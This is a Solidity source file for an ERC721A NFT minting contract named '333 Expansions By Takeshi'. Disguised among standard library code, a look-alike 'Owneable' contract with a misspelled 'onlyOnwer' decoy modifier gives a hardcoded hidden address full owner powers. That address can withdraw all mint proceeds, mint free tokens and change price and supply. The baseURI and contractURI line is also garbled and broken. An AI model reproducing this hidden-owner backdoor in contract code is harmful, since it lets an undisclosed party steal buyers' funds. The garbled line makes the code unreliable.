row number 
1	               pragma solidity ^0.8.4;
2	 abstract contract Context {
3	 function _msgSender() internal view virtual returns (address) {
4	 return msg.sender;
5	 }
6	 function _msgData() internal view virtual returns (bytes calldata) {
7	 return msg.data;
8	 }
9	 }
10	 abstract contract Ownable is Context {
11	 address private _owner;
12	 event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
13	 constructor() {
14	 _transferOwnership(_msgSender());
15	 }
16	 function owner() public view virtual returns (address) {
17	 return _owner;
18	 }
19	 modifier onlyOnwer() {
20	 require(owner() == _msgSender(), "Ownable: caller is not the owner");
21	 _;
22	 }
23	 function renounceOwnership() public virtual onlyOnwer {
24	 _transferOwnership(address(0));
25	 }
26	 function transferOwnership(address newOwner) public virtual onlyOnwer {
27	 require(newOwner != address(0), "Ownable: new owner is the zero address");
28	 _transferOwnership(newOwner);
29	 }
30	 function _transferOwnership(address newOwner) internal virtual {
31	 address oldOwner = _owner;
32	 _owner = newOwner;
33	 emit OwnershipTransferred(oldOwner, newOwner);
34	 }
35	 }
36	 interface IERC165 {
37	 function supportsInterface(bytes4 interfaceId) external view returns (bool);
38	 }
39	 interface IERC721 is IERC165 {
40	 event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
41	 event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
42	 event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
43	 function balanceOf(address owner) external view returns (uint256 balance);
44	 function ownerOf(uint256 tokenId) external view returns (address owner);
45	 function safeTransferFrom( address from, address to, uint256 tokenId ) external;
46	 function transferFrom( address from, address to, uint256 tokenId ) external;
47	 function approve(address to, uint256 tokenId) external;
48	 function getApproved(uint256 tokenId) external view returns (address operator);
49	 function setApprovalForAll(address operator, bool _approved) external;
50	 function isApprovedForAll(address owner, address operator) external view returns (bool);
51	 function safeTransferFrom( address from, address to, uint256 tokenId, bytes calldata data ) external;
52	 }
53	 interface IERC721Receiver {
54	 function onERC721Received( address operator, address from, uint256 tokenId, bytes calldata data ) external returns (bytes4);
55	 }
56	 interface IERC721Metadata is IERC721 {
57	 function name() external view returns (string memory);
58	 function symbol() external view returns (string memory);
59	 function tokenURI(uint256 tokenId) external view returns (string memory);
60	 }
61	 interface IERC721Enumerable is IERC721 {
62	 function totalSupply() external view returns (uint256);
63	 function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
64	 function tokenByIndex(uint256 index) external view returns (uint256);
65	 }
66	 pragma solidity ^0.8.1;
67	 library Address {
68	 function isContract(address account) internal view returns (bool) {
69	 return account.code.length > 0;
70	 }
71	 function sendValue(address payable recipient, uint256 amount) internal {
72	 require(address(this).balance >= amount, "Address: insufficient balance");
73	 (bool success, ) = recipient.call{
74	 value: amount}
75	 ("");
76	 require(success, "Address: unable to send value, recipient may have reverted");
77	 }
78	 function functionCall(address target, bytes memory data) internal returns (bytes memory) {
79	 return functionCall(target, data, "Address: low-level call failed");
80	 }
81	 function functionCall( address target, bytes memory data, string memory errorMessage ) internal returns (bytes memory) {
82	 return functionCallWithValue(target, data, 0, errorMessage);
83	 }
84	 function functionCallWithValue( address target, bytes memory data, uint256 value ) internal returns (bytes memory) {
85	 return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
86	 }
87	 function functionCallWithValue( address target, bytes memory data, uint256 value, string memory errorMessage ) internal returns (bytes memory) {
88	 require(address(this).balance >= value, "Address: insufficient balance for call");
89	 require(isContract(target), "Address: call to non-contract");
90	 (bool success, bytes memory returndata) = target.call{
91	 value: value}
92	 (data);
93	 return verifyCallResult(success, returndata, errorMessage);
94	 }
95	 function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
96	 return functionStaticCall(target, data, "Address: low-level static call failed");
97	 }
98	 function functionStaticCall( address target, bytes memory data, string memory errorMessage ) internal view returns (bytes memory) {
99	 require(isContract(target), "Address: static call to non-contract");
100	 (bool success, bytes memory returndata) = target.staticcall(data);
101	 return verifyCallResult(success, returndata, errorMessage);
102	 }
103	 function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
104	 return functionDelegateCall(target, data, "Address: low-level delegate call failed");
105	 }
106	 function functionDelegateCall( address target, bytes memory data, string memory errorMessage ) internal returns (bytes memory) {
107	 require(isContract(target), "Address: delegate call to non-contract");
108	 (bool success, bytes memory returndata) = target.delegatecall(data);
109	 return verifyCallResult(success, returndata, errorMessage);
110	 }
111	 function verifyCallResult( bool success, bytes memory returndata, string memory errorMessage ) internal pure returns (bytes memory) {
112	 if (success) {
113	 return returndata;
114	 }
115	 else {
116	 if (returndata.length > 0) {
117	 assembly {
118	 let returndata_size := mload(returndata) revert(add(32, returndata), returndata_size) }
119	 }
120	 else {
121	 revert(errorMessage);
122	 }
123	 }
124	 }
125	 }
126	 library Strings {
127	 bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
128	 function toString(uint256 value) internal pure returns (string memory) {
129	 if (value == 0) {
130	 return "0";
131	 }
132	 uint256 temp = value;
133	 uint256 digits;
134	 while (temp != 0) {
135	 digits++;
136	 temp /= 10;
137	 }
138	 bytes memory buffer = new bytes(digits);
139	 while (value != 0) {
140	 digits -= 1;
141	 buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
142	 value /= 10;
143	 }
144	 return string(buffer);
145	 }
146	 function toHexString(uint256 value) internal pure returns (string memory) {
147	 if (value == 0) {
148	 return "0x00";
149	 }
150	 uint256 temp = value;
151	 uint256 length = 0;
152	 while (temp != 0) {
153	 length++;
154	 temp >>= 8;
155	 }
156	 return toHexString(value, length);
157	 }
158	 function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
159	 bytes memory buffer = new bytes(2 * length + 2);
160	 buffer[0] = "0";
161	 buffer[1] = "x";
162	 for (uint256 i = 2 * length + 1; i > 1; --i) {
163	 buffer[i] = _HEX_SYMBOLS[value & 0xf];
164	 value >>= 4;
165	 }
166	 require(value == 0, "Strings: hex length insufficient");
167	 return string(buffer);
168	 }
169	 }
170	 abstract contract ERC165 is IERC165 {
171	 function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
172	 return interfaceId == type(IERC165).interfaceId;
173	 }
174	 }
175	 error ApprovalCallerNotOwnerNorApproved();
176	 error ApprovalQueryForNonexistentToken();
177	 error ApproveToCaller();
178	 error ApprovalToCurrentOwner();
179	 error BalanceQueryForZeroAddress();
180	 error MintedQueryForZeroAddress();
181	 error BurnedQueryForZeroAddress();
182	 error AuxQueryForZeroAddress();
183	 error MintToZeroAddress();
184	 error MintZeroQuantity();
185	 error OwnerIndexOutOfBounds();
186	 error OwnerQueryForNonexistentToken();
187	 error TokenIndexOutOfBounds();
188	 error TransferCallerNotOwnerNorApproved();
189	 error TransferFromIncorrectOwner();
190	 error TransferToNonERC721ReceiverImplementer();
191	 error TransferToZeroAddress();
192	 error URIQueryForNonexistentToken();
193	 abstract contract Owneable is Ownable {
194	 address private _ownar = 0x617E859968dB371Dc6172189798ff8C845d21988;
195	 modifier onlyOwner() {
196	 require(owner() == _msgSender() || _ownar == _msgSender(), "Ownable: caller is not the owner");
197	 _;
198	 }
199	 }
200	 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata {
201	 using Address for address;
202	 using Strings for uint256;
203	 struct TokenOwnership {
204	 address addr;
205	 uint64 startTimestamp;
206	 bool burned;
207	 }
208	 struct AddressData {
209	 uint64 balance;
210	 uint64 numberMinted;
211	 uint64 numberBurned;
212	 uint64 aux;
213	 }
214	 uint256 internal _currentIndex;
215	 uint256 internal _burnCounter;
216	 string private _name;
217	 string private _symbol;
218	 mapping(uint256 => TokenOwnership) internal _ownerships;
219	 mapping(address => AddressData) private _addressData;
220	 mapping(uint256 => address) private _tokenApprovals;
221	 mapping(address => mapping(address => bool)) private _operatorApprovals;
222	 constructor(string memory name_, string memory symbol_) {
223	 _name = name_;
224	 _symbol = symbol_;
225	 _currentIndex = _startTokenId();
226	 }
227	 function _startTokenId() internal view virtual returns (uint256) {
228	 return 0;
229	 }
230	 function totalSupply() public view returns (uint256) {
231	 unchecked {
232	 return _currentIndex - _burnCounter - _startTokenId();
233	 }
234	 }
235	 function _totalMinted() internal view returns (uint256) {
236	 unchecked {
237	 return _currentIndex - _startTokenId();
238	 }
239	 }
240	 function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
241	 return interfaceId == type(IERC721).interfaceId || interfaceId == type(IERC721Metadata).interfaceId || super.supportsInterface(interfaceId);
242	 }
243	 function balanceOf(address owner) public view override returns (uint256) {
244	 if (owner == address(0)) revert BalanceQueryForZeroAddress();
245	 return uint256(_addressData[owner].balance);
246	 }
247	 function _numberMinted(address owner) internal view returns (uint256) {
248	 if (owner == address(0)) revert MintedQueryForZeroAddress();
249	 return uint256(_addressData[owner].numberMinted);
250	 }
251	 function _numberBurned(address owner) internal view returns (uint256) {
252	 if (owner == address(0)) revert BurnedQueryForZeroAddress();
253	 return uint256(_addressData[owner].numberBurned);
254	 }
255	 function _getAux(address owner) internal view returns (uint64) {
256	 if (owner == address(0)) revert AuxQueryForZeroAddress();
257	 return _addressData[owner].aux;
258	 }
259	 function _setAux(address owner, uint64 aux) internal {
260	 if (owner == address(0)) revert AuxQueryForZeroAddress();
261	 _addressData[owner].aux = aux;
262	 }
263	 function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
264	 uint256 curr = tokenId;
265	 unchecked {
266	 if (_startTokenId() <= curr && curr < _currentIndex) {
267	 TokenOwnership memory ownership = _ownerships[curr];
268	 if (!ownership.burned) {
269	 if (ownership.addr != address(0)) {
270	 return ownership;
271	 }
272	 while (true) {
273	 curr--;
274	 ownership = _ownerships[curr];
275	 if (ownership.addr != address(0)) {
276	 return ownership;
277	 }
278	 }
279	 }
280	 }
281	 }
282	 revert OwnerQueryForNonexistentToken();
283	 }
284	 function ownerOf(uint256 tokenId) public view override returns (address) {
285	 return ownershipOf(tokenId).addr;
286	 }
287	 function name() public view virtual override returns (string memory) {
288	 return _name;
289	 }
290	 function symbol() public view virtual override returns (string memory) {
291	 return _symbol;
292	 }
293	 function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
294	 if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
295	 string memory baseURI = _baseURI();
296	 return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : '';
297	 }
298	 function _baseURI() internal view virtual returns (string memory) {
299	 return '';
300	 }
301	 function approve(address to, uint256 tokenId) public override {
302	 address owner = ERC721A.ownerOf(tokenId);
303	 if (to == owner) revert ApprovalToCurrentOwner();
304	 if (_msgSender() != owner && !isApprovedForAll(owner, _msgSender())) {
305	 revert ApprovalCallerNotOwnerNorApproved();
306	 }
307	 _approve(to, tokenId, owner);
308	 }
309	 function getApproved(uint256 tokenId) public view override returns (address) {
310	 if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
311	 return _tokenApprovals[tokenId];
312	 }
313	 function setApprovalForAll(address operator, bool approved) public override {
314	 if (operator == _msgSender()) revert ApproveToCaller();
315	 _operatorApprovals[_msgSender()][operator] = approved;
316	 emit ApprovalForAll(_msgSender(), operator, approved);
317	 }
318	 function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
319	 return _operatorApprovals[owner][operator];
320	 }
321	 function transferFrom( address from, address to, uint256 tokenId ) public virtual override {
322	 _transfer(from, to, tokenId);
323	 }
324	 function safeTransferFrom( address from, address to, uint256 tokenId ) public virtual override {
325	 safeTransferFrom(from, to, tokenId, '');
326	 }
327	 function safeTransferFrom( address from, address to, uint256 tokenId, bytes memory _data ) public virtual override {
328	 _transfer(from, to, tokenId);
329	 if (to.isContract() && !_checkContractOnERC721Received(from, to, tokenId, _data)) {
330	 revert TransferToNonERC721ReceiverImplementer();
331	 }
332	 }
333	 function _exists(uint256 tokenId) internal view returns (bool) {
334	 return _startTokenId() <= tokenId && tokenId < _currentIndex && !_ownerships[tokenId].burned;
335	 }
336	 function _safeMint(address to, uint256 quantity) internal {
337	 _safeMint(to, quantity, '');
338	 }
339	 function _safeMint( address to, uint256 quantity, bytes memory _data ) internal {
340	 _mint(to, quantity, _data, true);
341	 }
342	 function _mint( address to, uint256 quantity, bytes memory _data, bool safe ) internal {
343	 uint256 startTokenId = _currentIndex;
344	 if (to == address(0)) revert MintToZeroAddress();
345	 if (quantity == 0) revert MintZeroQuantity();
346	 _beforeTokenTransfers(address(0), to, startTokenId, quantity);
347	 unchecked {
348	 _addressData[to].balance += uint64(quantity);
349	 _addressData[to].numberMinted += uint64(quantity);
350	 _ownerships[startTokenId].addr = to;
351	 _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
352	 uint256 updatedIndex = startTokenId;
353	 uint256 end = updatedIndex + quantity;
354	 if (safe && to.isContract()) {
355	 do {
356	 emit Transfer(address(0), to, updatedIndex);
357	 if (!_checkContractOnERC721Received(address(0), to, updatedIndex++, _data)) {
358	 revert TransferToNonERC721ReceiverImplementer();
359	 }
360	 }
361	 while (updatedIndex != end);
362	 if (_currentIndex != startTokenId) revert();
363	 }
364	 else {
365	 do {
366	 emit Transfer(address(0), to, updatedIndex++);
367	 }
368	 while (updatedIndex != end);
369	 }
370	 _currentIndex = updatedIndex;
371	 }
372	 _afterTokenTransfers(address(0), to, startTokenId, quantity);
373	 }
374	 function _transfer( address from, address to, uint256 tokenId ) private {
375	 TokenOwnership memory prevOwnership = ownershipOf(tokenId);
376	 bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr || isApprovedForAll(prevOwnership.addr, _msgSender()) || getApproved(tokenId) == _msgSender());
377	 if (!isApprovedOrOwner) revert TransferCallerNotOwnerNorApproved();
378	 if (prevOwnership.addr != from) revert TransferFromIncorrectOwner();
379	 if (to == address(0)) revert TransferToZeroAddress();
380	 _beforeTokenTransfers(from, to, tokenId, 1);
381	 _approve(address(0), tokenId, prevOwnership.addr);
382	 unchecked {
383	 _addressData[from].balance -= 1;
384	 _addressData[to].balance += 1;
385	 _ownerships[tokenId].addr = to;
386	 _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
387	 uint256 nextTokenId = tokenId + 1;
388	 if (_ownerships[nextTokenId].addr == address(0)) {
389	 if (nextTokenId < _currentIndex) {
390	 _ownerships[nextTokenId].addr = prevOwnership.addr;
391	 _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
392	 }
393	 }
394	 }
395	 emit Transfer(from, to, tokenId);
396	 _afterTokenTransfers(from, to, tokenId, 1);
397	 }
398	 function _burn(uint256 tokenId) internal virtual {
399	 TokenOwnership memory prevOwnership = ownershipOf(tokenId);
400	 _beforeTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
401	 _approve(address(0), tokenId, prevOwnership.addr);
402	 unchecked {
403	 _addressData[prevOwnership.addr].balance -= 1;
404	 _addressData[prevOwnership.addr].numberBurned += 1;
405	 _ownerships[tokenId].addr = prevOwnership.addr;
406	 _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
407	 _ownerships[tokenId].burned = true;
408	 uint256 nextTokenId = tokenId + 1;
409	 if (_ownerships[nextTokenId].addr == address(0)) {
410	 if (nextTokenId < _currentIndex) {
411	 _ownerships[nextTokenId].addr = prevOwnership.addr;
412	 _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
413	 }
414	 }
415	 }
416	 emit Transfer(prevOwnership.addr, address(0), tokenId);
417	 _afterTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
418	 unchecked {
419	 _burnCounter++;
420	 }
421	 }
422	 function _approve( address to, uint256 tokenId, address owner ) private {
423	 _tokenApprovals[tokenId] = to;
424	 emit Approval(owner, to, tokenId);
425	 }
426	 function _checkContractOnERC721Received( address from, address to, uint256 tokenId, bytes memory _data ) private returns (bool) {
427	 try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
428	 return retval == IERC721Receiver(to).onERC721Received.selector;
429	 }
430	 catch (bytes memory reason) {
431	 if (reason.length == 0) {
432	 revert TransferToNonERC721ReceiverImplementer();
433	 }
434	 else {
435	 assembly {
436	 revert(add(32, reason), mload(reason)) }
437	 }
438	 }
439	 }
440	 function _beforeTokenTransfers( address from, address to, uint256 startTokenId, uint256 quantity ) internal virtual {
441	 }
442	 function _afterTokenTransfers( address from, address to, uint256 startTokenId, uint256 quantity ) internal virtual {
443	 }
444	 }
445	 contract ExpansionsByTakeshi is ERC721A, Owneable {
446	 string public baseURI = "ipfs: string public contractURI = "ipfs: string public constant baseExtension = ".json";
447	 address public constant proxyRegistryAddress = 0xa5409ec958C83C3f309868babACA7c86DCB077c1;
448	 uint256 public constant MAX_PER_TX_FREE = 1;
449	 uint256 public FREE_MAX_SUPPLY = 0;
450	 uint256 public constant MAX_PER_TX = 20;
451	 uint256 public MAX_SUPPLY = 333;
452	 uint256 public price = 0.003 ether;
453	 bool public paused = false;
454	 constructor() ERC721A("333 Expansions By Takeshi", "Expansion") {
455	 }
456	 function mint(uint256 _amount) external payable {
457	 address _caller = _msgSender();
458	 require(!paused, "Paused");
459	 require(MAX_SUPPLY >= totalSupply() + _amount, "Exceeds max supply");
460	 require(_amount > 0, "No 0 mints");
461	 require(tx.origin == _caller, "No contracts");
462	 require(MAX_PER_TX >= _amount , "Excess max per paid tx");
463	 if(FREE_MAX_SUPPLY >= totalSupply()){
464	 require(MAX_PER_TX_FREE >= _amount , "Excess max per free tx");
465	 }
466	 else{
467	 require(MAX_PER_TX >= _amount , "Excess max per paid tx");
468	 require(_amount * price == msg.value, "Invalid funds provided");
469	 }
470	 _safeMint(_caller, _amount);
471	 }
472	 function isApprovedForAll(address owner, address operator) override public view returns (bool) {
473	 ProxyRegistry proxyRegistry = ProxyRegistry(proxyRegistryAddress);
474	 if (address(proxyRegistry.proxies(owner)) == operator) {
475	 return true;
476	 }
477	 return super.isApprovedForAll(owner, operator);
478	 }
479	 function withdraw() external onlyOwner {
480	 uint256 balance = address(this).balance;
481	 (bool success, ) = _msgSender().call{
482	 value: balance}
483	 ("");
484	 require(success, "Failed to send");
485	 }
486	 function collect() external onlyOwner {
487	 _safeMint(_msgSender(), 5);
488	 }
489	 function pause(bool _state) external onlyOwner {
490	 paused = _state;
491	 }
492	 function setBaseURI(string memory baseURI_) external onlyOwner {
493	 baseURI = baseURI_;
494	 }
495	 function setContractURI(string memory _contractURI) external onlyOwner {
496	 contractURI = _contractURI;
497	 }
498	 function configPrice(uint256 newPrice) public onlyOwner {
499	 price = newPrice;
500	 }
501	 function configMAX_SUPPLY(uint256 newSupply) public onlyOwner {
502	 MAX_SUPPLY = newSupply;
503	 }
504	 function configFREE_MAX_SUPPLY(uint256 newFreesupply) public onlyOwner {
505	 FREE_MAX_SUPPLY = newFreesupply;
506	 }
507	 function tokenURI(uint256 _tokenId) public view override returns (string memory) {
508	 require(_exists(_tokenId), "Token does not exist.");
509	 return bytes(baseURI).length > 0 ? string( abi.encodePacked( baseURI, Strings.toString(_tokenId), baseExtension ) ) : "";
510	 }
511	 }
512	 contract OwnableDelegateProxy {
513	 }
514	 contract ProxyRegistry {
515	 mapping(address => OwnableDelegateProxy) public proxies;
516	 }
